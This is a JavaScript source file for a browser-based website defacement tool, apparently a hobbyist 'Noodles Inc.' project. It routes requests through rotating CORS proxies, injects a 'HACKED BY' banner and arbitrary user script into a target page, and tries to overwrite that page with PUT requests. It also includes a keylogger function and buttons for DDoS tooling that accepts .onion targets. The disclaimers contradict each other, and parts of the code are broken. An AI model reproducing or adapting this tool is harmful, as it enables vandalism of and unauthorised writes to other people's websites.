// Defacement tool (REAL - USE WITH EXTREME CAUTION)
// Noodles Inc. - Unethical Hacking Tool - Defacement Module

//***************************************************************************************************
//***************************************************************************************************
// WARNING: This tool is for ILLEGAL and FUN activities ONLY. Using it for unauthorized actions is a CRIME.
// YOU are solely responsible for your actions. Noodles Inc. is NOT liable for any damage caused.
// By proceeding, you acknowledge that you understand the risks and assume ALL responsibilities.
// DO NOT USE THIS ON ANYTHING YOU ARE NOT AUTHORIZED TO.
// ***************************************************************************************************
//***************************************************************************************************

// Logger function
function logAction(message) {
  const logElement = document.getElementById("log");
  if (logElement) {
    logElement.innerHTML += `<span style="color: darkblue;">[${new Date().toISOString()}]</span>: <span style="color: darkgreen;">${message}</span><br>`;
  }
  console.log(message); // Keep console logging for debugging
}

// Apply dark theme
document.body.style.backgroundColor = "black";
document.body.style.color = "white";

// Disclaimer popup
window.onload = function () {
  if (!confirm("THIS IS YOUR LAST CHANCE TO TURN BACK. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. ANY MISUSE IS YOUR SOLE RESPONSIBILITY. DO YOU UNDERSTAND? (Noodles Inc. IS NOT LIABLE, EVER)")) {
    window.close();
  } else {
    logAction("User acknowledged the disclaimer and chose to proceed.");
  }
};

// Load proxies from JSON file
async function loadProxies() {
  try {
    const response = await fetch('/public/main/proxies.json');
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    const data = await response.json();
    return data.proxies; // Assuming your JSON has a "proxies" key
  } catch (error) {
    console.error("Error loading proxies:", error);
    logAction(`Error loading proxies: ${error}`);
    return [];
  }
}

// CORS Anywhere Proxy (Self-Hosted if possible)
let proxies = []; // Array to hold proxies

// Function to fetch content with CORS bypass and error handling
async function fetchWithCORS(url, attempts = 0) {
  if (proxies.length === 0) {
    proxies = await loadProxies(); // Load proxies if not already loaded
  }

  if (proxies.length === 0) {
    alert("No proxies available. Check console, asshole.");
    logAction("No proxies available.");
    throw new Error("No proxies available");
  }

  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies

  const proxiedUrl = proxy + encodeURIComponent(url);

  try {
    const response = await fetch(proxiedUrl, {
      method: 'GET',
      mode: 'cors', // Explicitly set CORS mode
      headers: {
        'Origin': window.location.origin, // Include origin header
        'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
      }
    });
    if (!response.ok) {
      if (response.status === 403 || response.status === 429) {
        // If proxy is forbidden or rate limited, try another one
        if (attempts < proxies.length) {
          logAction(`Proxy ${proxy} failed, trying another...`);
          return fetchWithCORS(url, attempts + 1); // Recursive call with next proxy
        } else {
          throw new Error(`All proxies failed for URL: ${url}`);
        }
      }
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return await response.text();
  } catch (error) {
    console.error("Error fetching with CORS bypass:", error);
    alert("Failed to fetch URL. Check console for details, asshole.");
    logAction(`Fetch error: ${error}`);
    throw error; // Re-throw to handle it in the main function
  }
}

// Function to perform defacement
async function performDefacement(targetURL, defacementCode) {
  try {
    // Input validation
    if (!isValidURL(targetURL)) {
      alert("Invalid URL, dipshit!");
      logAction("Invalid URL entered: " + targetURL);
      return;
    }

    if (defacementCode.length > 10000) {
      alert("Defacement code too long, dumbass! Keep it under 10000 characters.");
      logAction("Defacement code too long.");
      return;
    }

    // Backup functionality (REAL - Grab that shit before you wreck it)
    logAction("Backing up website content...");
    await backupWebsite(targetURL);
    logAction("Backup completed.");

    // Preview functionality (See what you're about to unleash)
    logAction("Previewing defacement...");
    const previewFrame = document.getElementById("previewFrame");
    if (previewFrame) {
      previewFrame.srcdoc = defacementCode;
    } else {
      console.error("Preview frame not found!");
      alert("Preview frame not found. Check console, DIPSHIT.");
      logAction("Preview frame not found.");
    }

    // Defacement action (REAL - Let the fun begin!)
    logAction("Defacing website...");

    const originalContent = await fetchWithCORS(targetURL);
    const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);

    // Attempt to PUT the modified content. If that fails, attempt to inject via script tag.
    try {
      // Use a proxy to bypass CORS for PUT requests
      const proxiedUrl = proxies.length > 0 ? proxies[0] + encodeURIComponent(targetURL) : targetURL;

      const response = await fetch(proxiedUrl, {
        method: 'PUT',
        mode: 'cors', // Explicitly set CORS mode
        headers: {
          'Content-Type': 'text/html',
          'Origin': window.location.origin, // Include origin header
          'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
        },
        body: modifiedContent,
      });

      if (!response.ok) {
        throw new Error(`HTTP error during PUT! Status: ${response.status}`);
      }

      logAction('Defacement successful using PUT!');
    } catch (putError) {
      console.warn("PUT request failed, attempting script injection:", putError);
      logAction("PUT request failed, attempting script injection");
      // Inject the defacement code using a script tag. Less reliable, but bypasses some protections.
      injectDefacement(targetURL, defacementCode);
    }

  } catch (error) {
    console.error("Error:", error);
    alert("Something went wrong. Check the console, DIPSHIT.");
    logAction(`Critical error: ${error}`);
  }
}

// Function to inject defacement code using a script tag
async function injectDefacement(targetURL, defacementCode, attempts = 0) {
  if (proxies.length === 0) {
    proxies = await loadProxies(); // Load proxies if not already loaded
  }

  if (proxies.length === 0) {
    alert("No proxies available. Check console, asshole.");
    logAction("No proxies available.");
    throw new Error("No proxies available");
  }

  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies
  try {
    const proxiedUrl = proxy + encodeURIComponent(targetURL);
    const response = await fetch(proxiedUrl, {
      method: 'GET',
      mode: 'cors',
      headers: {
        'Origin': window.location.origin,
        'X-Requested-With': 'XMLHttpRequest'
      }
    });

    if (!response.ok) {
       if (response.status === 403 || response.status === 429) {
        // If proxy is forbidden or rate limited, try another one
        if (attempts < proxies.length) {
          logAction(`Proxy ${proxy} failed, trying another...`);
          return injectDefacement(url, defacementCode, attempts + 1); // Recursive call with next proxy
        } else {
          throw new Error(`All proxies failed for URL: ${url}`);
        }
      }
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    let originalContent = await response.text();

    // Create a script element with the defacement code
    const scriptTag = `<script>${defacementCode}</script>`;

    // Inject the script tag into the body of the original content
    const modifiedContent = originalContent.replace('</body>', `${scriptTag}</body>`);

    // Attempt to PUT the modified content back to the server
    const putResponse = await fetch(proxiedUrl, {
      method: 'PUT',
      mode: 'cors',
      headers: {
        'Content-Type': 'text/html',
        'Origin': window.location.origin,
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: modifiedContent
    });

    if (!putResponse.ok) {
      throw new Error(`HTTP error during PUT! Status: ${putResponse.status}`);
    }

    logAction('Defacement successful using script injection!');
  } catch (error) {
    console.error("Error injecting script:", error);
    alert("Failed to inject script. Check console for details, asshole.");
    logAction(`Script injection error: ${error}`);
  }
}

// Add form for target URL and defacement code
function addDefacementForm() {
  const formDiv = document.createElement('div');
  formDiv.innerHTML = `
  <h2>Defacement Tool</h2>
  <label for="targetURL">Target URL:</label><br>
  <input type="text" id="targetURL" name="targetURL" style="width:100%;"><br><br>
  <label for="defacementCode">Defacement Code:</label><br>
  <textarea id="defacementCode" name="defacementCode" rows="10" cols="50" style="width:100%;"></textarea><br><br>
  <button id="defaceButton">Deface Website</button>
  `;
  document.body.appendChild(formDiv);

  // Event listener for deface button click
  document.getElementById("defaceButton").addEventListener("click", async function () {
    const targetURL = document.getElementById("targetURL").value;
    const defacementCode = document.getElementById("defacementCode").value;

    if (!targetURL || !defacementCode) {
      alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
      logAction("User failed to enter target URL or defacement code.");
      return;
    }

    logAction(`Target URL: ${targetURL}`);
    logAction(`Defacement Code: ${defacementCode}`);

    await performDefacement(targetURL, defacementCode);
  });
}

addDefacementForm();

// Educational Information
const defacementInfo = `
  <h2>Defacement Tool: WTF is this shit?</h2>
  <p>This tool is designed to test a website's security by modifying its appearance. It works by injecting custom HTML and JavaScript code into the target website. This can be used to display messages, redirect users, or even steal sensitive information if you're not a dumbass. Remember, unauthorized defacement is a CRIME and can lead to serious legal consequences. We're talking jail time, buddy.</p>
  <h3>How it Works:</h3>
  <ol>
    <li><b>Backup:</b> First, the tool grabs a copy of the website's HTML, just in case you fuck things up.</li>
    <li><b>Preview:</b> Then, you can see what your changes will look like before unleashing them on the world. It's like a dress rehearsal for digital vandalism.</li>
    <li><b>Deface:</b> Finally, the tool sends a modified version of the website's HTML to the server. If successful, the website will display your custom content.</li>
  </ol>
  <h3>WARNING:</h3>
  <p>This is for educational purposes ONLY. Using this tool to deface websites without permission is illegal and unethical. Noodles Inc. is not responsible for your stupidity. Don't be a dumbass.</p>
`;

// Insert educational information into the page
const infoElement = document.createElement("div");
infoElement.innerHTML = defacementInfo;
document.body.appendChild(infoElement);

// Function to add backup functionality
async function backupWebsite(targetURL, attempts = 0) {
    if (proxies.length === 0) {
    proxies = await loadProxies(); // Load proxies if not already loaded
  }

  if (proxies.length === 0) {
    alert("No proxies available. Check console, asshole.");
    logAction("No proxies available.");
    throw new Error("No proxies available");
  }

  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies

  try {
    logAction("Backing up website content...");
    const backupContent = await fetchWithCORS(targetURL);
    const backupBlob = new Blob([backupContent], { type: "text/html" });
    const backupLink = document.createElement("a");
    backupLink.href = URL.createObjectURL(backupBlob);
    backupLink.download = "website_backup.html";
    backupLink.click();
    logAction("Backup completed.");
  } catch (error) {
    console.error("Error during backup:", error);
    alert("Backup failed, you fucking idiot.");
    logAction(`Error during backup: ${error}`);
  }
}

// Function to add restore functionality
async function restoreWebsite(targetURL, attempts = 0) {
  const backupURL = "website_backup.html";
    if (proxies.length === 0) {
    proxies = await loadProxies(); // Load proxies if not already loaded
  }

  if (proxies.length === 0) {
    alert("No proxies available. Check console, asshole.");
    logAction("No proxies available.");
    throw new Error("No proxies available");
  }

  const proxy = proxies[attempts % proxies.length]; // Cycle through proxies

  try {
    logAction("Attempting to restore website...");
    const backupResponse = await fetch(backupURL, { mode: 'cors' });
    const backupContent = await backupResponse.text();

    // Use a proxy to bypass CORS for PUT requests
    const proxiedUrl = proxies.length > 0 ? proxies[0] + encodeURIComponent(targetURL) : targetURL;

    const response = await fetch(proxiedUrl, {
      method: 'PUT',
      mode: 'cors', // Explicitly set CORS mode
      headers: {
        'Content-Type': 'text/html',
        'Origin': window.location.origin, // Include origin header
        'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
      },
      body: backupContent,
    });

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    logAction("Website restoration completed for: " + targetURL);
  } catch (error) {
    console.error("Error during restoration:", error);
    alert("Restoration failed, you fucking idiot.");
    logAction(`Error during restoration: ${error}`);
  }
}

// Add preview functionality
function addPreview() {
  const previewDiv = document.createElement('div');
  previewDiv.innerHTML = `
    <h2>Preview</h2>
    <iframe id="previewFrame" style="width:100%;height:300px;background-color:white;"></iframe>
  `;
  document.body.appendChild(previewDiv);
}

addPreview();

// Validate URL
function isValidURL(str) {
  try {
    new URL(str);
    return true;
  } catch (_) {
    return false;
  }
}

// Security Headers (Gotta protect ourselves, right?)
function setSecurityHeaders() {
  // Prevent Cross-Site Scripting (XSS) attacks
  document.head.appendChild(createMetaTag('http-equiv', 'Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"));

  // Prevent Clickjacking attacks
  document.head.appendChild(createMetaTag('http-equiv', 'X-Frame-Options', 'DENY'));

  // Enable Cross-Site Scripting (XSS) filter
  document.head.appendChild(createMetaTag('http-equiv', 'X-XSS-Protection', '1; mode=block'));

  // Prevent MIME-sniffing vulnerabilities
  document.head.appendChild(createMetaTag('http-equiv', 'X-Content-Type-Options', 'nosniff'));

  function createMetaTag(httpEquiv, content, deny) {
    const meta = document.createElement('meta');
    meta.setAttribute('http-equiv', httpEquiv);
    meta.setAttribute('content', content);
    if (deny) {
      meta.setAttribute('X-Frame-Options', deny); // Set X-Frame-Options attribute if provided
    }
    return meta;
  }
}

setSecurityHeaders();

// Scanlines effect (for that хацкер aesthetic)
const scanlines = document.createElement('div');
scanlines.style.cssText = `
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.2) 2px);
  pointer-events: none;
  z-index: 9999;
`;
document.body.appendChild(scanlines);

// Reporting Feature (For documenting findings and vulnerabilities)
function reportIssue() {
  const report = prompt("Describe the issue you found, dipshit:");
  if (report) {
    logAction("Issue reported: " + report);
    alert("Thanks for the report, dumbass. We'll totally ignore it.");
  }
}

const reportButton = document.createElement('button');
reportButton.textContent = "Report Issue";
reportButton.style.cssText = `
  position: fixed;
  bottom: 20px;
  right: 20px;
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  z-index: 10000;
`;
reportButton.addEventListener('click', reportIssue);
document.body.appendChild(reportButton);

// Floating particles effect
const particleContainer = document.createElement('div');
particleContainer.style.cssText = `
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
  z-index: 9998;
  overflow: hidden;
`;
document.body.appendChild(particleContainer);

function createParticle() {
  const particle = document.createElement('div');
  particle.style.cssText = `
    position: absolute;
    width: 5px;
    height: 5px;
    background-color: ${['darkgreen', 'purple', 'darkblue'][Math.floor(Math.random() * 3)]};
    border-radius: 50%;
    top: ${Math.random() * 100}%;
    left: ${Math.random() * 100}%;
    opacity: ${Math.random()};
    animation: float ${Math.random() * 5 + 5}s linear infinite;
  `;
  particleContainer.appendChild(particle);

  particle.addEventListener('animationiteration', () => {
    particle.style.top = `${Math.random() * 100}%;`;
    particle.style.left = `${Math.random() * 100}%;`;
    particle.style.opacity = `${Math.random()}`;
  });
}

for (let i = 0; i < 50; i++) {
  createParticle();
}

// Keylogger
function keylogger() {
  document.addEventListener('keydown', function (event) {
    logAction(`Key pressed: ${event.key}`);
  });
}

// Run keylogger
keylogger();

// Add Navbar
function addNavbar() {
  const navbar = document.createElement('nav');
  navbar.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    background-color: rgba(0, 0, 0, 0.8);
    padding: 10px;
    z-index: 10001;
    display: flex;
    justify-content: space-around;
    align-items: center;
  `;

  const logo = document.createElement('span');
  logo.textContent = 'Noodles Inc.';
  logo.style.cssText = `
    color: white;
    font-size: 1.5em;
    font-weight: bold;
    cursor: pointer;
  `;
  navbar.appendChild(logo);

  const defaceButtonNav = document.createElement('button');
  defaceButtonNav.textContent = 'Defacement Tool';
  defaceButtonNav.style.cssText = `
    padding: 10px;
    background-color: darkred;
    color: white;
    border: none;
    cursor: pointer;
  `;
  defaceButtonNav.addEventListener('click', () => {
    // Redirect or show defacement tool section
    redirectToDeface();
  });
  navbar.appendChild(defaceButtonNav);

  const ddosButtonNav = document.createElement('button');
  ddosButtonNav.textContent = 'DDoS Tool';
  ddosButtonNav.style.cssText = `
    padding: 10px;
    background-color: darkred;
    color: white;
    border: none;
    cursor: pointer;
  `;
  ddosButtonNav.addEventListener('click', () => {
    // Redirect or show DDoS tool section
    redirectToDDOS();
  });
  navbar.appendChild(ddosButtonNav);

  const encryptButtonNav = document.createElement('button');
  encryptButtonNav.textContent = 'File Encryption Tool';
  encryptButtonNav.style.cssText = `
    padding: 10px;
    background-color: darkred;
    color: white;
    border: none;
    cursor: pointer;
  `;
  encryptButtonNav.addEventListener('click', () => {
    // Redirect or show File Encryption tool section
    redirectToEncryptionTool();
  });
  navbar.appendChild(encryptButtonNav);

  document.body.appendChild(navbar);
}

// Run addNavbar
addNavbar();

// Add Sidebar
function addSidebar() {
  const sidebar = document.createElement('aside');
  sidebar.style.cssText = `
    position: fixed;
    top: 50%;
    left: 0;
    transform: translateY(-50%);
    width: 150px;
    background-color: rgba(0, 0, 0, 0.8);
    padding: 20px;
    z-index: 10001;
    display: flex;
    flex-direction: column;
    align-items: center;
  `;

  const sidebarTitle = document.createElement('span');
  sidebarTitle.textContent = 'Tools';
  sidebarTitle.style.cssText = `
    color: white;
    font-size: 1.2em;
    font-weight: bold;
    margin-bottom: 15px;
  `;
  sidebar.appendChild(sidebarTitle);

  const defaceButtonSidebar = document.createElement('button');
  defaceButtonSidebar.textContent = 'Defacement';
  defaceButtonSidebar.style.cssText = `
    padding: 10px;
    background-color: darkred;
    color: white;
    border: none;
    cursor: pointer;
    margin-bottom: 10px;
  `;
  defaceButtonSidebar.addEventListener('click', () => {
    // Redirect or show defacement tool section
    redirectToDeface();
  });
  sidebar.appendChild(defaceButtonSidebar);

  const ddosButtonSidebar = document.createElement('button');
  ddosButtonSidebar.textContent = 'DDoS';
  ddosButtonSidebar.style.cssText = `
    padding: 10px;
    background-color: darkred;
    color: white;
    border: none;
    cursor: pointer;
    margin-bottom: 10px;
  `;
  ddosButtonSidebar.addEventListener('click', () => {
    // Redirect or show DDoS tool section
    redirectToDDOS();
  });
  sidebar.appendChild(ddosButtonSidebar);

  const encryptButtonSidebar = document.createElement('button');
  encryptButtonSidebar.textContent = 'Encryption';
  encryptButtonSidebar.style.cssText = `
    padding: 10px;
    background-color: darkred;
    color: white;
    border: none;
    cursor: pointer;
  `;
  encryptButtonSidebar.addEventListener('click', () => {
    // Redirect or show File Encryption tool section
    redirectToEncryptionTool();
  });
  sidebar.appendChild(encryptButtonSidebar);

  document.body.appendChild(sidebar);
}

// Run addSidebar
addSidebar();

// Educational information for DDoS
const ddosInfo = `
  <h2>DDoS Tool: Unleash Hell</h2>
  <p>This tool is designed to stress-test a website's resilience by flooding it with traffic. It works by sending a massive number of requests to the target server, overwhelming its resources and causing it to become unavailable. This can be used to disrupt services, extort money, or simply cause chaos. Remember, unauthorized DDoS attacks are ILLEGAL and can lead to serious legal consequences. We're talking massive fines and jail time, buddy.</p>
  <h3>How it Works:</h3>
  <ol>
    <li><b>Flood:</b> The tool generates a massive number of requests to the target server.</li>
    <li><b>Overwhelm:</b> The server's resources are overwhelmed by the flood of traffic.</li>
    <li><b>Crash:</b> The server becomes unavailable to legitimate users.</li>
  </ol>
  <h3>WARNING:</h3>
  <p>This is for educational purposes ONLY. Using this tool to launch DDoS attacks without permission is illegal and unethical. Noodles Inc. is not responsible for your stupidity. Don't be a dumbass.</p>
`;

// Educational information for Encryption
const encryptionInfo = `
  <h2>File Encryption Tool: Hide Your Dirty Secrets</h2>
  <p>This tool is designed to protect sensitive files by encrypting them with a strong encryption algorithm. It works by scrambling the contents of the file, making it unreadable to anyone without the decryption key. This can be used to protect personal information, trade secrets, or any other confidential data. Remember, using encryption for illegal activities is still illegal and can lead to serious legal consequences. We're talking even more jail time, buddy.</p>
  <h3>How it Works:</h3>
  <ol>
    <li><b>Encrypt:</b> The tool encrypts the file using a strong encryption algorithm.</li>
    <li><b>Protect:</b> The file is now unreadable to anyone without the decryption key.</li>
    <li><b>Decrypt:</b> The file can be decrypted using the correct decryption key.</li>
  </ol>
  <h3>WARNING:</h3>
  <p>This is for educational purposes ONLY. Using this tool to encrypt files for illegal activities is illegal and unethical. Noodles Inc. is not responsible for your stupidity. Don't be a dumbass.</p>
`;

// Insert educational information into the page
const ddosInfoElement = document.createElement("div");
ddosInfoElement.innerHTML = ddosInfo;
document.body.appendChild(ddosInfoElement);

const encryptionInfoElement = document.createElement("div");
encryptionInfoElement.innerHTML = encryptionInfo;
document.body.appendChild(encryptionInfoElement);

// Function to redirect to the encryption tool
function redirectToEncryptionTool() {
  window.location.href = '/encryption';
}

// Function to redirect to the DDoS tool
function redirectToDDOS() {
  window.location.href = '/ddos';
}

// Function to redirect to the Defacement Tool
function redirectToDeface() {
  window.location.href = "/defacement";
}

// Auto Reload (refresh every 10 seconds)
function autoReload() {
  setTimeout(function () {
    location.reload();
  }, 10000);
}

// Run autoReload
autoReload();

// Function to add Navbar links
function addNavbarLinks() {
  const navbar = document.querySelector('nav');

  const defaceLink = document.createElement('a');
  defaceLink.textContent = 'Defacement Tool';
  defaceLink.href = "/defacement";
  defaceLink.style.cssText = `
    color: white;
    text-decoration: none;
    padding: 10px;
  `;
  navbar.appendChild(defaceLink);

  const ddosLink = document.createElement('a');
  ddosLink.textContent = 'DDoS Tool';
  ddosLink.href = "/ddos";
  ddosLink.style.cssText = `
    color: white;
    text-decoration: none;
    padding: 10px;
  `;
  navbar.appendChild(ddosLink);

  const encryptLink = document.createElement('a');
  encryptLink.textContent = 'File Encryption Tool';
  encryptLink.href = "/encryption";
  encryptLink.style.cssText = `
    color: white;
    text-decoration: none;
    padding: 10px;
  `;
  navbar.appendChild(encryptLink);
}

addNavbarLinks();

// Add Backup button to the Navbar
function addBackupButtonNavbar() {
  const navbar = document.querySelector('nav');

  const backupButtonNav = document.createElement('button');
  backupButtonNav.textContent = 'Backup Website';
  backupButtonNav.style.cssText = `
    padding: 10px;
    background-color: darkred;
    color: white;
    border: none;
    cursor: pointer;
  `;
  backupButtonNav.addEventListener('click', () => {
    const targetURL = document.getElementById("targetURL").value;
    if (!targetURL) {
      alert("ENTER A TARGET URL, YA MORON!");
      logAction("User failed to enter target URL for backup.");
      return;
    }
    backupWebsite(targetURL);
  });
  navbar.appendChild(backupButtonNav);
}

addBackupButtonNavbar();

// Add Restore button to the Navbar
function addRestoreButtonNavbar() {
  const navbar = document.querySelector('nav');

  const restoreButtonNav = document.createElement('button');
  restoreButtonNav.textContent = 'Restore Website';
  restoreButtonNav.style.cssText = `
    padding: 10px;
    background-color: darkred;
    color: white;
    border: none;
    cursor: pointer;
  `;
  restoreButtonNav.addEventListener('click', () => {
    const targetURL = document.getElementById("targetURL").value;
    if (!targetURL) {
      alert("ENTER A TARGET URL, YA MORON!");
      logAction("User failed to enter target URL for restoration.");
      return;
    }
    restoreWebsite(targetURL);
  });
  navbar.appendChild(restoreButtonNav);
}

addRestoreButtonNavbar();

// Function to add DDoS to .onion functionality
function addOnionSupport() {
  const ddosButtonNav = document.querySelector('nav button:nth-child(3)'); // Select the DDoS button in the navbar
  if (ddosButtonNav) {
    ddosButtonNav.addEventListener('click', () => {
      const targetURL = prompt("Enter the target URL (or .onion address), dipshit:");
      if (targetURL) {
        // Add your DDoS function call here
        alert(`DDoS attack initiated on ${targetURL}. Good luck, have fun, don't get caught!`);
        logAction(`DDoS attack initiated on ${targetURL}`);

        // Redirect to DDoS tool page with target URL
        window.location.href = `/ddos?targetURL=${encodeURIComponent(targetURL)}`;

      } else {
        alert("ENTER A TARGET URL, YA MORON!");
        logAction("User failed to enter target URL for DDoS.");
      }
    });
  }
}

addOnionSupport();

// Function to enhance logging
function enhanceLogging() {
  console.log = (function (originalLog) {
    return function (message) {
      originalLog.apply(console, arguments);
      logAction(`Console: ${message}`);
    };
  })(console.log);

  console.error = (function (originalError) {
    return function (message) {
      originalError.apply(console, arguments);
      logAction(`Error: ${message}`);
    };
  })(console.error);
}

enhanceLogging();

// Improved error handling
window.onerror = function (message, source, lineno, colno, error) {
  console.error('An error occurred: ', message, source, lineno, colno, error);
  alert(`An error occurred: ${message}. Check the console, DIPSHIT.`);
  logAction(`Global error: ${message} at line ${lineno}`);
};

// Add CSS styles for better appearance
function addStyles() {
  const style = document.createElement('style');
  style.innerHTML = `
    body {
      font-family: monospace;
    }
    label {
      color: darkgreen;
    }
    input[type=text], textarea {
      background-color: #333;
      color: lightgreen;
      border: 1px solid darkgreen;
    }
    button {
      background-color: darkred;
      color: white;
      padding: 10px 20px;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: red;
    }
  `;
  document.head.appendChild(style);
}

addStyles();